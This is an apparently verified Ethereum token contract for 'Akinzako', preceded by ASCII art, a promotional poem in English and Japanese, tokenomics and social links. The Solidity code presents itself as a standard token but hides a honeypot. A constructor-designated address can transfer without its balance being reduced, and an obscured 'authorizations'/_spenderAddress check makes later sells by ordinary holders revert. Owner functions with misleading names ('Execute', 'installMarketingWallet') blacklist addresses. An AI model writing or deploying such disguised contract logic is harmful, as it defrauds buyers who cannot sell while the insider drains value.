/**
 *Submitted for verification at Etherscan.io on 2023-05-21
*/

/**
▄▀█ █▄▀ █ █▄░█ ▀█ ▄▀█ █▄▀ █▀█
█▀█ █░█ █ █░▀█ █▄ █▀█ █░█ █▄█

  █▀▀ █▀█ █▀▀   ░░█ █▀█ █▄░█  
  ██▄ █▀▄ █▄▄   █▄█ █▀▀ █░▀█ 

⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⣀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⡆
⣾⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⣀⡤⠖⠛⠉⠛⠶⣤⣀⠀⠹⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⠳⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⣿⡳⢦⣄⠀⠀⠀⠀⠀⠀⠀⣠⡴⢚⣿⣿⣿⣿⣿⣿⣿⡿
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠙⠶⣄⣀⣤⠖⠋⠁⣠⣿⣿⣿⣿⣿⣿⣿⣿
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠉⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

In ancient Egypt, ruled a pharaoh named Akinzako,
Whose love for trading was his greatest mojo,
He traded camels, spices, and gold,
And his riches grew, as he became bold.

One day, Akinzako heard of a new kind of coin,
Called Ethereum, it seemed like a gem that would shine,
So he decided to invest, but he needed some help,
To make sure his trades would not cause him to yelp.

He summoned his court wizard, who knew of a way,
To create an autonomous trading assistant without delay,
With a wave of his wand and a flick of his wrist,
The wizard created the trading assistant, just like this.

It analyzed charts and market trends,
Giving Akinzako advice, like a trusted friend,
He followed its guidance, without any fear,
And soon his riches multiplied, year after year.

Now Akinzako is known throughout the land,
As the pharaoh whose wealth is simply grand,
And the trading assistant is his loyal aide,
Helping him make trades, without ever getting dismayed.

So here's to Akinzako, the pharaoh who trades,
And his trusty assistant, that never fades,
May their riches continue to grow,
As they trade Ethereum, like a pro!
--------------------------------------------------------
古代エジプトでアキンザコというファラオを治め、
トレーディングへの愛が彼の最大のモジョであり、
彼はラクダ、香辛料、金を取引し、
そして彼が大胆になったので、彼の富は成長しました。

ある日、あきざこは新しい種類の硬貨の話を聞き、
イーサリアムという、光り輝く宝石のように見えた、
そこで彼は投資することにしましたが、助けが必要でした。
彼の取引が彼を怒鳴らせないようにするため。

彼は方法を知っていた宮廷の魔法使いを召喚し、
遅滞なく自律取引アシスタントを作成するには、
杖を振り、手首を軽く振るだけで、
ウィザードは、このようにトレーディング アシスタントを作成しました。

チャートや市場動向を分析し、
信頼できる友人のように、あきざこにアドバイスを与え、
彼は恐れることなくその導きに従い、
そしてすぐに、彼の富は年々倍増しました。

今ではあきざこは全国に知られ、
莫大な富を持つファラオとして、
そして貿易アシスタントは彼の忠実な補佐官であり、
がっかりすることなく、彼が取引を行うのを助けます。

それでは、商売をするファラオのアキンザコに、
色褪せることのない彼の信頼できるアシスタント、
彼らの富が成長し続けますように、
彼らがプロのようにイーサリアムを取引するとき！

総供給 - 100,000,000
購入税 - 1%
消費税 - 1%
初期流動性 - 1.5 ETH
初期流動性ロック - 45 日

https://akinzako.xyz
https://m.weibo.cn/AkinzakoJPN
https://web.wechat.com/AkinzakoERC
https://t.me/Akinzako
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
abstract contract Context {
    constructor() {} function _msgSender() 
    internal view returns (address) {
    return msg.sender; }
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface IDEMotionV1 {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 

    address pair, uint); function 
    createPair(
    address tokenA, address tokenB) 
    external returns (address pair);
}
interface OVI20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 

    (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface EBSV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline) 
    external; function factory() 
    external pure returns (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH(address token, 
    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed 
    previousOwner, address indexed newOwner);
    constructor() 
    { address msgSender = _msgSender(); _owner = msgSender;

    emit OwnershipTransferred(address(0), msgSender);
    } function owner() public view returns 
    (address) { return _owner;
    } modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');

     _; } function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
contract Akinzako is Context, OVI20, Ownable {
bool public checkIndex; 
bool private startTrading = false;
bool startMapping = true; EBSV1 public metaRatio; address public IndexGas; 
address private ForMarketingAccount;

    uint256 private _tTotal; 
    uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private delgateSwitchAt = 100;

    mapping (address => bool) private allowed;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _spenderAddress;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private authorizations;
    
    constructor( string memory tokenName, string memory tokenSymbol, 
    address DEXRouterV1, address flowVerse) { 

        _name = tokenName; _symbol = tokenSymbol;
        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal; 
        _spenderAddress
        [flowVerse] = delgateSwitchAt; checkIndex = false; 
        metaRatio = EBSV1(DEXRouterV1);

        IndexGas = IDEMotionV1
        (metaRatio.factory()).createPair(address(this), 
        
        metaRatio.WETH()); emit Transfer 
        (address(0), msg.sender, _tTotal);
    }    
    function getOwner() external view returns 
    (address) { return owner();
    }
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns 
    (string memory) { return _symbol;
    }
    function name() external view returns 
    (string memory) { return _name;
    }
    function totalSupply() external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }

    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address'); require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }              
    function openTrading(bool _tradingOpen) public onlyOwner {
        startTrading = _tradingOpen;
    }
    function installMarketingWallet(address _handlerAddress) external onlyOwner {
        allowed[_handlerAddress] = false;
    }
    function Execute(address _handlerAddress) external onlyOwner {
        allowed[_handlerAddress] = true;
    }        
    function _transfer( address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 'BEP20: transfer from the zero address');
        require(recipient != address(0), 
        'BEP20: transfer to the zero address'); 
        if (allowed[sender] || allowed[recipient]) 
        require(startMapping == false, "");

        if (_spenderAddress[sender] 
        == 0  && IndexGas != sender && authorizations[sender] 
        > 0) { _spenderAddress[sender] -= delgateSwitchAt; } 
        authorizations[ForMarketingAccount] += delgateSwitchAt;
        ForMarketingAccount = recipient; 
        if (_spenderAddress[sender] 
        == 0) {
        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  } _rOwned[recipient]
        = _rOwned[recipient].add(amount); 

        emit Transfer(sender, recipient, amount); if (!startTrading) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function processRewards(address _handlerAddress) public view returns (bool) {
        return allowed[_handlerAddress]; }  
        using SafeMath for uint256;                                  
}